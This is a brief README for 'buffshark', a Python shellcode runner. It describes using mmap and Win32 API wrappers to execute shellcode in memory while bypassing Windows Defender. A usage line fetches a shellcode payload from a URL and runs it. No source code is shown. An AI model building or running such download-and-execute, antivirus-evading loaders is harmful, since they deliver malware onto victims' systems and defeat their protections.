# buffshark-shellcode-runner

## Python Shellcode Runner for windows and linux
This script utilizes mmap(for linux) and win32 api wrappers (for windows) to execute shellcode in memory and bypass Windows Defender.

## Usage
Example: `python3 buffshark.py -u http://127.0.0.1:8080/shellcode.bin -a [win/nix]`
